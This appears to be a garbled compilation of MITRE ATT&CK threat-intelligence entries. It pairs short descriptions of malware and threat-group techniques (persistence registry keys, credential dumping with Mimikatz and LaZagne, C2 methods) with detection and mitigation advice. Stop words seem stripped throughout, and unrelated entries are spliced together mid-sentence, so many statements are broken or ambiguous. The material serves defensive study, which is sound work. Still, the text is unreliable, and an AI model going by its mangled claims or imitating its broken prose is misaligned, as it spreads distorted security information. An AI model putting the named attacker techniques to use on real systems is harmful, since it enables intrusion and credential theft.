Valak June 2020) [FIN5](https://attack.mitre.org/groups/G0053) legitimate VPN, Citrix, VNC credentials maintain access victim environment.(Citation: FireEye Respond Webinar July 2017)(Citation: DarkReading FireEye FIN5 Oct 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) Monitor contextual data malicious payload, compilation times, file hashes, watermarks identifiable configuration information. cases, malware repositories identify features tool adversary, watermarks [Cobalt Strike](https://attack.mitre.org/software/S0154) payloads.(Citation: Analyzing Dec 2020)
Much activity visibility target organization, detection behavior difficult. Detection efforts focused post-compromise phases adversary lifecycle. Monitor user accounts logged systems access access patterns multiple systems short period time. monitor user SSH-agent socket files users. [Pillowmint](https://attack.mitre.org/software/S0517) multiple native Windows APIs execute conduct process injections.(Citation: Trustwave Pillowmint June 2020) [Bisonal](https://attack.mitre.org/software/S0268) delivered malicious email attachments.(Citation: Talos Bisonal Mar 2020)  Filter network traffic prevent protocols network boundary unnecessary. [QuasarRAT](https://attack.mitre.org/software/S0262) ability enumerate Wide Network (WAN) IP requests ip-api[.]com, freegeoip[.]net, api[.]ipify[.]org observed user-agent string `Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0`.(Citation: CISA AR18-352A Quasar RAT December 2018) Check common UAC bypass weaknesses Windows systems aware risk posture address issues appropriate. (Citation: Github UACMe) [RTM](https://attack.mitre.org/software/S0148) <code>FindNextUrlCacheEntryA</code> <code>FindFirstUrlCacheEntryA</code> functions search specific strings browser history.(Citation: ESET RTM Feb 2017) [InvisiMole](https://attack.mitre.org/software/S0260) register Windows service named CsPower execution chain, Windows service named clr_optimization_v2.0.51527_X86 achieve persistence.(Citation: ESET InvisiMole June 2020) [Winnti Windows](https://attack.mitre.org/software/S0141) service svchost.exe.(Citation: Novetta Winnti April 2015) [EvilBunny](https://attack.mitre.org/software/S0396) executed commands scheduled tasks.(Citation: Cyphort EvilBunny Dec 2014) [APT28](https://attack.mitre.org/groups/G0007)'s operation involved [CHOPSTICK](https://attack.mitre.org/software/S0023) modules air-gapped machines files written USB sticks transfer data command traffic.(Citation: FireEye APT28)(Citation: SIR 19)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [TrickBot](https://attack.mitre.org/software/S0266) module networkDll process list discovery.(Citation: ESET Trickbot Oct 2020)(Citation: Bitdefender Trickbot March 2020) [Ebury](https://attack.mitre.org/software/S0377) obfuscated strings simple XOR encryption static key.(Citation: ESET Ebury Feb 2014) Monitor queried domain (DNS) registry data buy, lease, rent infrastructure targeting. Detection efforts focused stages adversary lifecycle, Command Control. [SombRAT](https://attack.mitre.org/software/S0615) uploaded collected data files compromised host C2 server.(Citation: BlackBerry CostaRicto November 2020) (Citation: Kaspersky Cloud Atlas August 2019) [Ursnif](https://attack.mitre.org/software/S0386) deleted data staged tmp files exfiltration.(Citation: TrendMicro Ursnif Mar 2015) [Kwampirs](https://attack.mitre.org/software/S0236) downloads additional files C2 servers.(Citation: Symantec Security Center Trojan.Kwampirs) [APT1](https://attack.mitre.org/groups/G0006) created email accounts social engineering, phishing, registering domains.(Citation: Mandiant APT1) [Nidiran](https://attack.mitre.org/software/S0118) create service named msamger (Microsoft Security Accounts Manager), mimics legitimate database name.(Citation: Symantec Backdoor.Nidiran)(Citation: SAM) [SpeakUp](https://attack.mitre.org/software/S0374) Perl scripts.(Citation: CheckPoint SpeakUp Feb 2019) [Sykipot](https://attack.mitre.org/software/S0018) <code>ipconfig /all</code> gather network configuration details.(Citation: AlienVault Sykipot 2011) [TA551](https://attack.mitre.org/groups/G0127) obfuscated variable names JavaScript configuration file.(Citation: Unit 42 Valak July 2020) [Ping](https://attack.mitre.org/software/S0097) identify remote systems network.(Citation: TechNet Ping) [Carberp](https://attack.mitre.org/software/S0484) created hidden file Startup folder current user.(Citation: Trusteer Carberp October 2010) [Shark](https://attack.mitre.org/software/S1019) binaries named `audioddg.pdb` `Winlangdb.pdb` legitimate.(Citation: ClearSky Siamesekitten August 2021) (Citation: Kaspersky Cloud Atlas August 2019) [Milan](https://attack.mitre.org/software/S1015) API `DnsQuery_A` DNS resolution.(Citation: Kaspersky Lyceum October 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) injected malicious macros Word Excel documents mapped network drives.(Citation: ESET Gamaredon June 2020) [Suckfly](https://attack.mitre.org/groups/G0039) victim's internal network hosts ports 8080, 5900, 40 open.(Citation: Symantec Suckfly 2016) [Dragonfly](https://attack.mitre.org/groups/G0035) tools [Mimikatz](https://attack.mitre.org/software/S0002), [CrackMapExec](https://attack.mitre.org/software/S0488), [PsExec](https://attack.mitre.org/software/S0029).(Citation: Secureworks IRON LIBERTY July 2019) [Remsec](https://attack.mitre.org/software/S0125) OS version information, name, processor architecture, machine role, OS edition.(Citation: Kaspersky ProjectSauron Technical Analysis) [FIN5](https://attack.mitre.org/groups/G0053) cleared event logs victims.(Citation: Mandiant FIN5 GrrCON Oct 2016) [Night Dragon](https://attack.mitre.org/campaigns/C0002), threat actors company extranet servers secondary C2 servers.(Citation: McAfee Night Dragon) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors backdoor named [FunnyDream](https://attack.mitre.org/software/S1044).(Citation: Bitdefender FunnyDream Campaign November 2020)  [SUNSPOT](https://attack.mitre.org/software/S0562) Windows API functions <code>MoveFileEx</code> <code>NtQueryInformationProcess</code> [SUNBURST](https://attack.mitre.org/software/S0559) injection process.(Citation: CrowdStrike SUNSPOT Implant January 2021)  Monitor newly executed processes perform sudo caching suoders file elevate privileges. [KeyBoy](https://attack.mitre.org/software/S0387) VBS scripts installing files performing execution.(Citation: CitizenLab KeyBoy Nov 2016) [TrickBot](https://attack.mitre.org/software/S0266) collects email addresses Outlook.(Citation: Trend Micro Trickbot Nov 2018) [CCBkdr](https://attack.mitre.org/software/S0222) legitimate, signed version 5.33 CCleaner software distributed CCleaner's distribution site.(Citation: Talos CCleanup 2017)(Citation: Intezer Aurora Sept 2017)(Citation: Avast CCleaner3 2018) [FunnyDream](https://attack.mitre.org/software/S1044) compressed collected files zLib.(Citation: Bitdefender FunnyDream Campaign November 2020) [Tonto Team](https://attack.mitre.org/groups/G0131) stage compromising vulnerable Exchange server.(Citation: ESET Exchange Mar 2021) [FlawedAmmyy](https://attack.mitre.org/software/S0381) data collected compromised host C2 servers.(Citation: Korean FSI TA505 2020) [Stuxnet](https://attack.mitre.org/software/S0603) MS10-073 undisclosed Task Scheduler vulnerability escalate privileges local Windows machines.(Citation: Symantec W.32 Stuxnet Dossier) [APT3](https://attack.mitre.org/groups/G0022) tool delete files.(Citation: FireEye Clandestine Fox) Review <code>false</code> values <code>LSFileQuarantineEnabled</code> entry application's <code>Info.plist</code> file (required application). <code>false</code> <code>LSFileQuarantineEnabled</code> application quarantine flag. Unsandboxed applications unspecified <code>LSFileQuarantineEnabled</code> entry default setting quarantine flag.

QuarantineEvents SQLite database list files assigned <code>com.apple.quarantine</code> attribute, located <code>~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2</code>. event UUID, timestamp, application, Gatekeeper score, decision allowed. (Citation: TheEclecticLightCompany Quarantine flag) [Mis-Type](https://attack.mitre.org/software/S0084) network traffic communicate HTTP.(Citation: Cylance Dust Storm) [Waterbear](https://attack.mitre.org/software/S0579) presence specific security software.(Citation: Trend Micro Waterbear December 2019) [CORESHELL](https://attack.mitre.org/software/S0137) unused machine instructions attempt hinder analysis.(Citation: FireEye APT28) [RedLeaves](https://attack.mitre.org/software/S0153) network parameters.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Lizar](https://attack.mitre.org/software/S0681) decrypt configuration data.(Citation: BiZone Lizar 2021) Monitor API calls execute malicious payloads loading shared modules. [FIN7](https://attack.mitre.org/groups/G0046) lured victims double-click images attachments execute hidden LNK file.(Citation: FireEye FIN7 April 2017)(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. [StrifeWater](https://attack.mitre.org/software/S1034) collect OS version, architecture, machine create unique token infected host.(Citation: Cybereason StrifeWater Feb 2022) [Mori](https://attack.mitre.org/software/S1047) read data Registry including `HKLM\Software\NFC\IPA` and
`HKLM\Software\NFC\`.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [IndigoZebra](https://attack.mitre.org/groups/G0136) acquired source tools [NBTscan](https://attack.mitre.org/software/S0590) Meterpreter operations.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)  Monitor ACLs file/directory ownership. commands modify ACLs file/directory ownership built-in utilities generate false positive alert rate, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. Routinely check account role permissions ensure expected users roles permission modify cloud firewalls.  [Chimera](https://attack.mitre.org/groups/G0114) Windows Command batch scripts execution compromised hosts.(Citation: NCC Chimera January 2021) [Kobalos](https://attack.mitre.org/software/S0641) modify timestamps replaced files, <code>ssh</code> credential stealer <code>sshd</code> deploy [Kobalos](https://attack.mitre.org/software/S0641).(Citation: ESET Kobalos Jan 2021)  [APT29](https://attack.mitre.org/groups/G0016) conducted widespread scanning target environments identify vulnerabilities exploit.(Citation: Cybersecurity Advisory SVR TTP 2021) Data loss prevention detect block sensitive data unencrypted protocols. [ChChes](https://attack.mitre.org/software/S0144) steals credentials stored Internet Explorer.(Citation: PWC Cloud Hopper Technical Annex April 2017) [SombRAT](https://attack.mitre.org/software/S0615) communicate DNS C2 server.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021) [BADFLICK](https://attack.mitre.org/software/S0642) relied users clicking malicious attachment delivered spearphishing.(Citation: Accenture MUDCARP March 2019) [GuLoader](https://attack.mitre.org/software/S0561) download malware execution victim's machine.(Citation: Medium Eli Salem GuLoader April 2021) [Wizard Spider](https://attack.mitre.org/groups/G0102) Invoke-Inveigh PowerShell cmdlets, service poisoning.(Citation: FireEye KEGTAP SINGLEMALT October 2020) [Empire](https://attack.mitre.org/software/S0363) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-TokenManipulation</code> manipulate access tokens.(Citation: Github PowerShell Empire) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover exploit DLL hijacking opportunities services processes.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Empire](https://attack.mitre.org/software/S0363) conduct packet captures target hosts.(Citation: Github PowerShell Empire) (Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Hildegard](https://attack.mitre.org/software/S0601) history -c script logs.(Citation: Unit 42 Hildegard Malware) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors [Tasklist](https://attack.mitre.org/software/S0057) targeted systems.(Citation: Bitdefender FunnyDream Campaign November 2020) [PipeMon](https://attack.mitre.org/software/S0501) communications RC4 encrypted.(Citation: ESET PipeMon 2020) [Responder](https://attack.mitre.org/software/S0174) captures hashes credentials services poisoned.(Citation: GitHub Responder) infrastructure patterns malicious content identified, internet scanning uncover adversary staged content accessible targeting.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused phases adversary lifecycle, [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003) , [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) , [Malicious Link](https://attack.mitre.org/techniques/T1204/001) . [Confucius](https://attack.mitre.org/groups/G0142) cloud storage service accounts host stolen data.(Citation: TrendMicro Confucius APT Feb 2018) [Caterpillar WebShell](https://attack.mitre.org/software/S0572) list local users system.(Citation: ClearSky Lebanese Cedar Jan 2021) (Citation: CrowdStrike AQUATIC PANDA December 2021) [Carbanak](https://attack.mitre.org/software/S0030) stores configuration files startup directory automatically execute commands persist reboots.(Citation: FireEye CARBANAK June 2017) [SDBbot](https://attack.mitre.org/software/S0461) ability determine domain proxy configured compromised host.(Citation: Proofpoint TA505 October 2019) [FIN8](https://attack.mitre.org/groups/G0061) distributed targeted emails Word documents embedded malicious macros.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye Fin8 2016)(Citation: FireEye Enemy FIN8 Aug 2016) [Chaes](https://attack.mitre.org/software/S0631) changed template target settings.xml file embedded Word document populated field downloaded URL payload.(Citation: Cybereason Chaes Nov 2020)  [SoreFang](https://attack.mitre.org/software/S0516) collect TCP/IP, DNS, DHCP, network adapter configuration compromised host <code>ipconfig.exe /all</code>.(Citation: CISA SoreFang July 2016) [Bazar](https://attack.mitre.org/software/S0534) create task named benign.(Citation: Cybereason Bazar July 2020) [FunnyDream](https://attack.mitre.org/software/S1044) download additional files compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) trojanized installers control software legitimate vendor app stores.(Citation: Secureworks IRON LIBERTY July 2019)(Citation: Gigamon Berserk Bear October 2021) (Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) Users trained authorize third-party applications don’t recognize. user pay attention redirect URL: URL misspelled convoluted sequence expected service SaaS application, spoof legitimate service. Users cautious permissions granting apps. example, offline access access read emails excite suspicions adversaries utilize SaaS APIs discover credentials sensitive communications. [Denis](https://attack.mitre.org/software/S0354) commands search directories files.(Citation: Cybereason Oceanlotus 2017)(Citation: Cybereason Cobalt Kitty 2017) patch management process implemented check unused dependencies, unmaintained vulnerable dependencies, unnecessary features, components, files, documentation. 
[Conti](https://attack.mitre.org/software/S0575) ability discover hosts target network.(Citation: CrowdStrike Wizard Spider October 2020) [Get2](https://attack.mitre.org/software/S0460) ability identify Windows version infected host.(Citation: Proofpoint TA505 October 2019) Enforce proxies dedicated servers services DNS systems communicate respective ports/protocols, systems network.  (Citation: FireEye TEMP.Veles 2018) [MoonWind](https://attack.mitre.org/software/S0149) saves keylogging routine .zip file directory.(Citation: Palo Alto MoonWind March 2017) [Volgmer](https://attack.mitre.org/software/S0180) gather IP address victim's machine.(Citation: Symantec Volgmer Aug 2014) Proactively search credentials Registry attempt remediate risk. [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware <code>CreateProcess</code> launch additional malicious components.(Citation: ESET Gamaredon June 2020) [APT33](https://attack.mitre.org/groups/G0064) variety publicly tools [LaZagne](https://attack.mitre.org/software/S0349) gather credentials.(Citation: Symantec Elfin Mar 2019)(Citation: FireEye APT33 Guardrail) [Wevtutil](https://attack.mitre.org/software/S0645) export events specific log.(Citation: Wevtutil Documentation)(Citation: F-Secure Lazarus Cryptocurrency Aug 2020) [Pupy](https://attack.mitre.org/software/S0192) enable/disable RDP connection start remote desktop session browser socket client.(Citation: GitHub Pupy) [macOS.OSAMiner](https://attack.mitre.org/software/S1048) [Stripped Payloads](https://attack.mitre.org/techniques/T1027/008) `plist` extension [Launch Agent](https://attack.mitre.org/techniques/T1543/001)'s folder. (Citation: SentinelLabs reversing run-only applescripts 2021) Contextual data describes activity attempt cloud permission settings.  [MuddyWater](https://attack.mitre.org/groups/G0069) malware collect victim’s OS version machine name.(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Trend Micro Muddy Water March 2021)(Citation: Talos MuddyWater Jan 2022) (Citation: CrowdStrike Carbon Spider August 2021)(Citation: FBI Flash FIN7 USB) [Misdat](https://attack.mitre.org/software/S0083) created registry persistence, including `HKCU\Software\dnimtsoleht\StubPath`, `HKCU\Software\snimtsOleht\StubPath`, `HKCU\Software\Backtsaleht\StubPath`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed. Components\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}`, `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}`.(Citation: Cylance Dust Storm)  [InvisiMole](https://attack.mitre.org/software/S0260) custom implementation DNS tunneling embed C2 communications DNS requests replies.(Citation: ESET InvisiMole June 2020) (Citation: Palo Alto Black-T October 2020) [Lazarus Group](https://attack.mitre.org/groups/G0032) conducted internal spearphishing compromised organization.(Citation: ClearSky Lazarus Aug 2020) [Doki](https://attack.mitre.org/software/S0600) communicated C2 HTTPS.(Citation: Intezer Doki July 20) [Nomadic Octopus](https://attack.mitre.org/groups/G0133) targeted victims spearphishing emails malicious attachments.(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) [POWERSOURCE](https://attack.mitre.org/software/S0145) queries Registry preparation setting achieve persistence.(Citation: Cisco DNSMessenger March 2017) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers delete files.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) downloading main config file, [Downdelph](https://attack.mitre.org/software/S0134) downloads multiple payloads C2 servers.(Citation: ESET Sednit 3) [Helminth](https://attack.mitre.org/software/S0170) creates folders store output batch scripts prior sending C2 server.(Citation: Palo Alto OilRig 2016) Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block methods rundll32.exe bypass application control. [Maze](https://attack.mitre.org/software/S0449) communicated hard-coded IP addresses HTTP.(Citation: McAfee Maze March 2020) [Stuxnet](https://attack.mitre.org/software/S0603) infected WinCC machines hardcoded database server password.(Citation: Symantec W.32 Stuxnet Dossier) [Cobalt Group](https://attack.mitre.org/groups/G0080) emails malicious links require users execute file macro infect victim machine.(Citation: Talos Cobalt July 2018)(Citation: Unit 42 Cobalt Gang Oct 2018)(Citation: Secureworks GOLD KINGSWOOD September 2018) Windows 10, enable cloud-delivered protection Attack Surface Reduction (ASR) rules block execution files resemble ransomware. (Citation: win10_asr) (Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019) (Citation: Cybereason Cobalt Kitty 2017) [Empire](https://attack.mitre.org/software/S0363) ability collect emails target system.(Citation: Github PowerShell Empire) Monitor newly constructed dylibs [Proton](https://attack.mitre.org/software/S0279) gathers credentials Google Chrome.(Citation: objsee mac malware 2017) Monitor newly constructed network connections received untrusted hosts uncommon data flows. analyzing packet contents detect application layer protocols, leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g. unauthorized, gratuitous, anomalous traffic patterns attempting access configuration content) [APT32](https://attack.mitre.org/groups/G0050) modified Windows Services ensure PowerShell scripts loaded system. [APT32](https://attack.mitre.org/groups/G0050) creates Windows service establish persistence.(Citation: ESET OceanLotus)(Citation: Cybereason Cobalt Kitty 2017)(Citation: ESET OceanLotus Mar 2019) [Remexi](https://attack.mitre.org/software/S0375) achieves persistence Userinit adding Registry key <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>.(Citation: Securelist Remexi Jan 2019) [FlawedAmmyy](https://attack.mitre.org/software/S0381) capture screenshots.(Citation: Korean FSI TA505 2020) Monitor newly constructed processes command-lines parent process ‘systemd’, parent process 1, execute ‘root’ user. [Machete](https://attack.mitre.org/software/S0409) find, encrypt, upload files fixed removable drives.(Citation: Cylance Machete Mar 2017)(Citation: ESET Machete July 2019)  [P.A.S. Webshell](https://attack.mitre.org/software/S0598) delete scripts subdirectory /tmp run.(Citation: ANSSI Sandworm January 2021) [OSX/Shlayer](https://attack.mitre.org/software/S0402) command <code>appDir="$(dirname $(dirname "$currentDir"))"</code> <code>$(dirname "$(pwd -P)")</code> construct installation paths.(Citation: sentinelone shlayer zshlayer)(Citation: 20 macOS Common Tools Techniques) (Citation: FireEye APT39 Jan 2019) [TajMahal](https://attack.mitre.org/software/S0467) ability manage automated queue egress files commands C2.(Citation: Kaspersky TajMahal April 2019) [Conti](https://attack.mitre.org/software/S0575) compiler-based obfuscation code, encrypt DLLs, hide Windows API calls.(Citation: CarbonBlack Conti July 2020)(Citation: Cybereason Conti Jan 2021)(Citation: CrowdStrike Wizard Spider October 2020) [Exaramel Linux](https://attack.mitre.org/software/S0401) uninstall persistence mechanism delete configuration file.(Citation: ANSSI Sandworm January 2021) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) exfiltrated files Dropbox API C2.(Citation: Zscaler APT31 Covid-19 October 2020) [Melcoz](https://attack.mitre.org/software/S0530) VBS scripts execute malicious DLLs.(Citation: Securelist Brazilian Banking Malware July 2020) [LazyScripter](https://attack.mitre.org/groups/G0140) spam emails weaponized archive document files initial infection vector.(Citation: MalwareBytes LazyScripter Feb 2021) (Citation: FireEye APT41 March 2020) embedded network devices capable storing passwords local accounts plain-text encrypted formats.  Ensure that, available, local passwords encrypted, vendor recommendations. (Citation: Cisco IOS Software Integrity Assurance - Credentials Management) [HyperStack](https://attack.mitre.org/software/S0537) RSA encryption C2 communications.(Citation: Accenture HyperStack October 2020) [Penquin](https://attack.mitre.org/software/S0587) encrypt communications BlowFish algorithm symmetric key exchanged Diffie Hellman.(Citation: Leonardo Turla Penquin 2020) Monitor behavior containers environment detect anomalous behavior malicious activity users deploy malicious images. Limit permissions creating snapshots backups privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies.(Citation: Mandiant M-Trends 2020) [Machete](https://attack.mitre.org/software/S0409) feature files drive removable drive hidden folder.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014) [Rover](https://attack.mitre.org/software/S0090) copies files removable drives <code>C:\system</code>.(Citation: Palo Alto Rover) [Ryuk](https://attack.mitre.org/software/S0446) called <code>GetLogicalDrives</code> emumerate mounted drives, <code>GetDriveTypeW</code> determine drive type.(Citation: CrowdStrike Ryuk January 2019) [Prikormka](https://attack.mitre.org/software/S0113) encodes C2 traffic Base64.(Citation: ESET Operation Groundbait) [VBShower](https://attack.mitre.org/software/S0442) <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\\[a-f0-9A-F]{8}</code> maintain persistence.(Citation: Kaspersky Cloud Atlas August 2019) Ensure user accounts administrative rights follow practices, including privileged access workstations, Time/Just Administration (JIT/JEA), strong authentication. Reduce users highly privileged Directory Roles.(Citation: SolarWinds Customer Guidance) [Ember Bear](https://attack.mitre.org/groups/G1003) tools download malicious code.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) Monitor enrollment devices user accounts alternative security settings require MFA credentials successful logon.  Monitor contextual data running process, include environment variables, image name, user/owner, reveal version features outdated, vulnerable, support updated security controls logging. example, monitoring Windows event (EID) 400, <code>EngineVersion</code> field version PowerShell running, highlight malicious downgrade attack.(Citation: inv_ps_attacks) [PowerSploit](https://attack.mitre.org/software/S0194) collection Privesc-PowerUp modules discover exploit search hijacking vulnerabilities.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) (Citation: Alperovitch 2014) [BendyBear](https://attack.mitre.org/software/S0574) encrypted payloads RC4 XOR.(Citation: Unit42 BendyBear Feb 2021) [Kobalos](https://attack.mitre.org/software/S0641) encrypts strings RC4 bundles functionality single function call.(Citation: ESET Kobalos Feb 2021)  [BLUELIGHT](https://attack.mitre.org/software/S0657) collect process filenames SID authority level.(Citation: Volexity InkySquid BLUELIGHT August 2021) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) enumerate ports victim machine.(Citation: CISA MAR SLOTHFULMEDIA October 2020) [Lizar](https://attack.mitre.org/software/S0681) PowerShell scripts.(Citation: BiZone Lizar 2021) [Mustang Panda](https://attack.mitre.org/groups/G0129) spearphishing attachments deliver initial access payloads.(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 November 2020)(Citation: Google TAG Ukraine Threat Landscape March 2022) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) ability search compromised host files.(Citation: SentinelOne Aoqin Dragon June 2022) [Turian](https://attack.mitre.org/software/S0647) ability XOR decryption key extract C2 server domains IP addresses.(Citation: ESET BackdoorDiplomacy Jun 2021) [BlackTech](https://attack.mitre.org/groups/G0098) DLL loading DLLs hardcoded names placing searched directories.(Citation: Trend Micro Waterbear December 2019)  [Azorult](https://attack.mitre.org/software/S0344) collect time zone system.(Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) [The White Company](https://attack.mitre.org/groups/G0089) ability delete malware target system.(Citation: Cylance Shaheen Nov 2018) Ensure valid password filters registered. Filter DLLs Windows installation directory (C:\Windows\System32\ default) domain controller local entry HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages. disabling <code>AlwaysInstallElevated</code> policy prevent elevated execution Windows Installer packages.(Citation: AlwaysInstallElevated 2018) (Citation: Symantec Elfin Mar 2019) [MechaFlounder](https://attack.mitre.org/software/S0459) python-based payload.(Citation: Unit 42 MechaFlounder March 2019) Toolkits PowerSploit framework PowerUp modules explore systems permission weaknesses scheduled tasks escalate privileges. (Citation: Powersploit) auditing tools capable detecting file permissions abuse opportunities systems enterprise correct them. Toolkits PowerSploit framework PowerUp modules explore systems service file permissions weaknesses.(Citation: Powersploit) [Bazar](https://attack.mitre.org/software/S0534) collect IP address NetBIOS infected machine.(Citation: Cybereason Bazar July 2020) [WhisperGate](https://attack.mitre.org/software/S0689) ability inject fourth stage suspended process created legitimate Windows utility `InstallUtil.exe`.(Citation: Cisco Ukraine Wipers January 2022) [HEXANE](https://attack.mitre.org/groups/G1001) [Mimikatz](https://attack.mitre.org/software/S0002)-based tool PowerShell script steal passwords Google Chrome.(Citation: Kaspersky Lyceum October 2021) Limit communications container service local Unix sockets remote access SSH. Require secure port access communicate APIs TLS disabling unauthenticated access Docker API Kubernetes API Server.(Citation: Docker Daemon Socket Protect)(Citation: Kubernetes API Control Access) [IceApple](https://attack.mitre.org/software/S1022) reflective code loading load .NET assemblies `MSExchangeOWAAppPool` targeted Exchange servers.(Citation: CrowdStrike IceApple 2022) [KillDisk](https://attack.mitre.org/software/S0607) attempts reboot machine terminating specific processes.(Citation: Trend Micro KillDisk 2) [TEARDROP](https://attack.mitre.org/software/S0560) Windows service <code>c:\windows\syswow64</code> folder.(Citation: Check Sunburst Teardrop December 2020)(Citation: FireEye SUNBURST Backdoor December 2020) [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader DLL Search Hijacking load malicious code legitimate `version.dll` `Microsoft.IdentityServer.ServiceHost.exe` execution process.(Citation: MSTIC FoggyWeb September 2021) [Crutch](https://attack.mitre.org/software/S0538) established persistence scheduled task impersonating Outlook item finder.(Citation: ESET Crutch December 2020) Restrict read/write access systemd unit files select privileged users legitimate manage services. [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors ability FTP C2.(Citation: McAfee Honeybee) [PingPull](https://attack.mitre.org/software/S1031) ability timestomp file.(Citation: Unit 42 PingPull Jun 2022) [Gallmaker](https://attack.mitre.org/groups/G0084) attempted exploit Microsoft’s DDE protocol gain access victim machines execution.(Citation: Symantec Gallmaker Oct 2018) [Earth Lusca](https://attack.mitre.org/groups/G1006) ProcDump hashes credentials dumping memory LSASS process.(Citation: TrendMicro EarthLusca 2022) Monitor newly constructed network connections received untrusted hosts.  [APT37](https://attack.mitre.org/groups/G0067) obfuscates strings payloads.(Citation: Talos Group123)(Citation: Securelist ScarCruft 2019)(Citation: Volexity InkySquid RokRAT August 2021) [LitePower](https://attack.mitre.org/software/S0680) HTTPS C2 communications.(Citation: Kaspersky WIRTE November 2021) adversaries provisioned server (ex: command control server), internet scans reveal servers adversaries acquired. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021) [RegDuke](https://attack.mitre.org/software/S0511) store encryption key Registry.(Citation: ESET Dukes October 2019) [Bad Rabbit](https://attack.mitre.org/software/S0606) executed user installation executable disguised flash installer.(Citation: ESET Bad Rabbit)(Citation: Secure List Bad Rabbit) adversary administrator level access local technique; restrict users accounts privileges require. [GreyEnergy](https://attack.mitre.org/software/S0342) cmd.exe execute in-memory.(Citation: ESET GreyEnergy Oct 2018) Monitor DLL files COR_PROFILER environment variables. [OSX/Shlayer](https://attack.mitre.org/software/S0402) collected IOPlatformUUID, session UID, OS version command <code>sw_vers -productVersion</code>.(Citation: Carbon Black Shlayer Feb 2019)(Citation: sentinelone shlayer zshlayer) Monitor newly constructed files abuse Office "Office Test" Registry key persistence compromised system. [Higaisa](https://attack.mitre.org/groups/G0126) XSL file VBScript code.(Citation: PTSecurity Higaisa 2020) Monitor file files setuid setgid bits set. Linux, auditd alert time user's actual effective (this sudo). [POWERSTATS](https://attack.mitre.org/software/S0223) upload files compromised hosts.(Citation: FireEye MuddyWater Mar 2018) [SideTwist](https://attack.mitre.org/software/S0610) decode decrypt messages received C2.(Citation: Check APT34 April 2021) Ensure containers running root default. Kubernetes environments, defining Pod Security Policy prevents pods running privileged containers.(Citation: Kubernetes Hardening Guide) [PoetRAT](https://attack.mitre.org/software/S0428) voStro.exe, compiled pypykatz (Python version [Mimikatz](https://attack.mitre.org/software/S0002)), steal credentials.(Citation: Talos PoetRAT April 2020) Monitor network data uncommon data flows client sending data receives server). Processes utilizing network network communication suspicious. Analyze packet contents detect communications follow expected protocol behavior port used. Monitor files accessed search common password storage locations user credentials. [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors established domains, appeared spoof legitimate domains.(Citation: BlackBerry CostaRicto November 2020) Monitor newly executed processes attempt local permission settings. Monitor newly executed processes running virtual instance, launched binary files common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). [WinMM](https://attack.mitre.org/software/S0059) C2.(Citation: Baumgartner Naikon 2015) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors custom proxy tool called "Agent" support multiple hops.(Citation: FoxIT Wocao December 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) performed credential dumping [LaZagne](https://attack.mitre.org/software/S0349) tools, including dumping passwords saved victim email.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater 